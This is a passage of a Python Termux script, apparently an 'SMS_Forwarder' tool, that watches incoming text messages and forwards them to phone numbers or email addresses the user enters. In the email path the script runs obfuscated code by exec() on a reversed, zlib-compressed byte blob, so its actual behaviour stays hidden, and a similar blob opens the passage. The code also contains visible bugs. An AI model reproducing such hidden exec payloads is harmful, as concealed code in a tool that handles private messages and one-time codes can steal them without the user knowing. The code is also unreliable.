*\xed\xac\xc9\xff\x8c\x85\xf2O\x93\xc0}d3f\x8f\x8d ]\x0f\x82\t\xe7C\xe7|1\xc1\x9f\xa9\xf6\x08 T\x8aq\x12\xe4Ib)\xc8\xac|\x8asd\xb7\x07\r0\x8f\xbf\xe6\x13]\x02\xc9\xf6E/\xdetts\x800\xd0\xfd(I\xdb\x1c\x87\xe3\xb2=\xef\xfd\x9d\xd98\xe4\x95\xe4\xb6\xbbX\x95\xb6F\x18\x05\xfbK3\x0e\xe5\xa7{p\xa5\x03$\x98./\xb2N\xb2\xe4\xdd\x0e\xf8B\xbf;\xf5\xba\xd3\x93k\x1a\xd5\x9cx'))

def SendNumber(to, data):
    def SendNumberCheck(number, data):
        try:
            subprocess.getoutput(f"termux-sms-send -n {number} {data}")
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))
            for data in details:
                try:
                  if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):
                      if (data['sender'] == 'You'):
                          if (data['type'] == 'failed'):
                              return False
                except: pass
            return True
        except: return False
    if not (SendNumberCheck(to, data)):
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
    else:
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()


STORE, ID = [], ""
def SendSMS(TO, SVE):
    global ID
    details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
    for data in details:
        SmsID = data["_id"]
        if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
            SmsID = str(SmsID)
            if (re.search(SmsID, ID)) : SMSLBAR()
            else:
                subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
                subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
                for to in TO:
                    if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf0"\xb3h\x00M|\x92\xf9 \x95)\xf9I\x15p\xea)\x99)\x89\xa9E\x19%\xea\xf8\xc1)\x16\xa5&\xe6\x95\xe7\xc9\x85\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IHQ\xd2S\xc9\xf0.+6(\x084KrP\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                    else: SendNumber(to, data["body"])
                ID += SmsID
        else: SMSLBAR()

def SMSLBAR():
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")
def Installer():
    def install(*args):
        for i in args: subprocess.getoutput("pip insall "+i)
    UNIMPORTED = []
    try: import requests
    except: UNIMPORTED.append("requests")
    try: import random
    except: UNIMPORTED.append("random")
    try: import smtplib
    except: UNIMPORTED.append("secure-smtplib")
    if not (len(UNIMPORTED) == 0):
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║ {yellow}SOME DEPENDENCIES COULD NOT BE INSTALLED {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        INSTALL = threading.Thread(target=install, args=(UNIMPORTED))
        INSTALL.start()
        while INSTALL.is_alive(): AnimLOAD(f" {yellow}Installing Building Dependencies...{white}", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
        INSTALL.join()
    if not (termux_api):
        apk_release = subprocess.getoutput("timeout 5 echo $TERMUX_APK_RELEASE")
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║        {white}Termux-API Not Installed {blue}!        {red}║", 20)
        center(f"{red}╠══════════════════════════════════════════╣", 5)
        center(Box(yellow+"Install Termux-API From "+apk_release, "║", " ", red+" ║", 49, "center", resultprint=False), 10)
        center(f"{red}║             {yellow}And try again {white}!              {red}║", 20)
        center(f"{red}║         {yellow}Dont worry its secure :)         {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        exit()
    else:
        if not (len(UNIMPORTED) == 0):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {yellow}Installtion Completed {white}!          {red}║", 20)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {white}Startig SMS_Forwarder...         {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2), clear()
            os.system("python "+str(sys.argv[0]))
        else: MENU()

def EmailMenu():
    try:
        Banner()
        if not (Internet()):
            print()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║    {blue}Check your internet connection...     {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║           {blue}Choose An Option...            {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║",30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}TRY AGAIN                  {red}║",30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║",30)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): EmailMenu()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║      {blue}Enter emails separated by '{green},{blue}'       {red}║", 25)
            center(f"╠══════════════════════════════════════════╝")
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            Emails = Input.split(",")
            Filter = []
            for email in Emails:
                if (email == ""): continue
                else: Filter.append(email)
            if (len(Filter) == 0): EmailMenu()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Emails", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, True)
    except KeyboardInterrupt: EXIT(False)

def PHMenu():
    Banner()
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
    center(f"╠══════════════════════════════════════════╝")
    center(f"║{Space(42)}")
    Input = INPUT("╚════► ")
    Numbers = Input.split(",")
    Filter = []
    for number in Numbers:
        if (number == ""): continue
        else: Filter.append(number)
    if (len(Filter) == 0): PHMenu()
    else:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print(yellow)
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
        sys.stdout.write("\r"+finaltxt)
        while True: SendSMS(Filter, False)

def MENU():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║           {blue}Choose An Option...            {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝\n",5)
        center(f"{magenta}[{white}01{magenta}]  {yellow}Forward Messages Via Email          ",20)
        center(f"{magenta}[{white}02{magenta}]  {yellow}Forward Messages Via Phone Number   ",20)
        center(f"{magenta}[{white}03{magenta}]  {yellow}About Tool                          ",20)
        center(f"{magenta}[{white}04{magenta}]  {yellow}Usage                               ",20)
        center(f"{magenta}[{white}05{magenta}]  {yellow}Update Tool                         ",20)
        center(f"{magenta}[{white}06{magenta}]  {yellow}More From Us                        ",20)
        center(f"{magenta}[{white}07{magenta}]  {yellow}Exit....                           \n",20)
        center(f"{red}╔═══════════════════════════════════════════",5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): EmailMenu()
        elif (Input == "2") or (Input == "02") or (Input == "two"): PHMenu()
        elif (Input == "3") or (Input == "03") or (Input == "three"): About()
        elif (Input == "4") or (Input == "04") or (Input == "four"): Usage()
        elif (Input == "5") or (Input == "05") or (Input == "five"): Update()
        elif (Input == "6") or (Input == "06") or (Input == "six"): os.system("am start -a android.intent.action.VIEW -d https://github.com/GreyTechno > /dev/null 2 > &1 "), MENU()
        elif (Input == "7") or (Input == "07") or (Input == "seven"): EXIT()
        else: 
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║       {magenta}Invalid Option Try Again...        {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)

if not (termux_api()): Installer()
else:
    if (Internet()): CheckVersion()
    if not (cmd()): MENU()
